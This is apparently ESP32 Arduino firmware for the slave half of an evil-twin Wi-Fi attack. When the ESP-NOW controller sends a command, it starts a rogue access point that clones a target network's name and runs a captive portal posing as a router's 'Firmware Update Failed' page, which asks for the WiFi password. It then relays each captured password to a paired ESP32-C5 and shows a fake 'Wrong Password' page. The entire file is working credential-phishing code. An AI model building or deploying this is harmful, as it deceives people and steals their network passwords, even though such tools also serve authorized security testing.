/*
This code is for the Slave - ESP32. Features:
 - answer for ESP-NOW requests to start evil twin (recieves BSSID & Name)
 - answer for ESP-NOW asks if user already provided a password to verify
*/


#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_now.h>

/* Swap these with your esp32-c5 mac */
uint8_t receiverAddress[] = {0xD0, 0xCF, 0x13, 0xE0, 0x42, 0x40};


const byte    DNS_PORT = 53;
IPAddress     apIP(172, 0, 0, 1);
DNSServer     dnsServer;
WebServer     webServer(80);

String        _tryPassword = "";
String        evilAPName   = "";


#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE    "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY     "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

void handleIndex();

String header(String t) {
  //Serial.print("\n HEADER INVOKED");
  String a = String(evilAPName);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>"
             + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>"
             + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
    //Serial.print("\n FOOTER INVOKED");
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String index() {
  //Serial.print("\n INDEX INVOKED");
  return header(TITLE)
       + "<div>" + BODY + "</ol></div><div>"
       + "<form action='/' method=post>"
       + "<label>WiFi password:</label>"
       + "<input type=password id='password' name='password' minlength='8'></input>"
       + "<input type=submit value=Continue>"
       + "</form>"
       + footer();
}

String lastPasswordSentToC5 = "";
int sentOverEspNow = 1;

//pass password entered by the user to C5
void sendPasswordToC5() {
  // Serial.print("\sendPasswordToC5 invoked, _tryPassword:");
  // Serial.println(_tryPassword);
  // Serial.print("\lastPasswordSentToC5:");
  // Serial.println(lastPasswordSentToC5);
  

  if ((_tryPassword.length() > 0) && 
   ((lastPasswordSentToC5.length() == 0)  || (_tryPassword != lastPasswordSentToC5))) {
    Serial.println("About to send, we assume it wasn't sent yet:");
    sentOverEspNow = 0;
    //during the loop, an event might set it to 1: 
    while (sentOverEspNow == 0) {
      Serial.print("\nSending pass to ESP32C5:");
      Serial.print(_tryPassword);

      const char *msg = _tryPassword.c_str();
      esp_err_t result = esp_now_send(receiverAddress, (uint8_t *)msg, strlen(msg));

      if (result == ESP_OK) {
        Serial.println("Password sent ok in short channel 1 time window!");
        lastPasswordSentToC5 = _tryPassword;
        delay(1000);
      } else {
        Serial.println("Password sending error, to be repeated.");
        delay(1000);
      }
    }
  } else {
    //Serial.println("\nNo password yet to pass to C5, doing nothing");
    delay(100);
  }
}

void OnDataSent(const uint8_t *mac_addr, esp_now_send_status_t status) {
  Serial.print("Sent to: ");
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", mac_addr[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.print(" | Status: ");
  Serial.println(status == ESP_NOW_SEND_SUCCESS ? "OK" : "ERROR");

  if (status == ESP_NOW_SEND_SUCCESS) {
    lastPasswordSentToC5 = "";
    sentOverEspNow = 1;
    _tryPassword = "";
  }
}

void OnDataRecv(const esp_now_recv_info *recv_info, const uint8_t *data, int len) {
  char incomingString[len + 1];
  memcpy(incomingString, data, len);
  incomingString[len] = '\0';

  String receivedData = String(incomingString);

  Serial.print("Odebrano od: ");
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", recv_info->src_addr[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println();

  Serial.print("Wiadomość: ");
  Serial.println(receivedData);

  //expect #()^7841%_<EvilTwinNetworkName>
  String startPattern = "#()^7841%_";
  int idx = receivedData.indexOf(startPattern);
  if (idx != -1) {
    String name = receivedData.substring(idx + startPattern.length());
    Serial.print("Received name:");Serial.println(name);
    if (!name.equals(evilAPName)) {
      evilAPName = name + "\u200B";
      //start main evil twin access point:
      WiFi.mode(WIFI_AP_STA);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
      Serial.print("Starting Soft AP: ");
      Serial.println(evilAPName);
      WiFi.softAP(evilAPName);
      dnsServer.start(DNS_PORT, "*", apIP);
      WiFi.disconnect();

      webServer.on("/", handleIndex);
      webServer.on("/result", handleResult);
      webServer.onNotFound(handleIndex);
      webServer.begin();
    } else {
      Serial.print("name == evilAPName:");
      Serial.println(name);
    }
  } else {
    //FAILED to parse, print communication error
    Serial.print("Communication error: ");
    Serial.println(receivedData);
    }
}


void setup() {
  Serial.begin(115200);
  delay(100);

  WiFi.mode(WIFI_AP_STA);

  delay(100);

  WiFi.softAP("---");
  delay(100);

  Serial.print("ESP32 MAC Address: ");
  Serial.println(WiFi.macAddress());

  if (esp_now_init() != ESP_OK) {
    Serial.println("Error initializing ESP-NOW");
    return;
  }
  
  esp_now_register_recv_cb(OnDataRecv);
  esp_now_register_send_cb(OnDataSent);

  // Add peer:
  esp_now_peer_info_t peerInfo = {};
  memcpy(peerInfo.peer_addr, receiverAddress, 6);
  peerInfo.channel = 1;  
  peerInfo.encrypt = false;

  if (esp_now_add_peer(&peerInfo) != ESP_OK) {
    Serial.println("Error adding peer!");
    return;
  }

  delay(100);
}

void handleResult() {
  webServer.send(200, "text/html",
    "<html><head><script>setTimeout(function(){window.location.href = '/';},10000);</script>"
    "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
    "</head><body><center>"
    "<h2><wrong style='text-shadow:1px 1px black;color:red;font-size:60px;'>&#8855;</wrong><br>Wrong Password</h2>"
    "<p>Please, try again.</p>"
    "</center></body></html>"
  );
}


void handleIndex() {

  if (webServer.hasArg("password")) {
    _tryPassword = webServer.arg("password");

    webServer.send(200, "text/html",
      "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
      "</head><body><center>"
      "<h2 style='font-size:7vw'>Verifying integrity, please wait...</h2>"
      "<script>setTimeout(function(){window.location.href='/result';},45000);</script>"
      "</center></body></html>"
    );
  } else {
    webServer.send(200, "text/html", index());
  }
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  sendPasswordToC5();
}

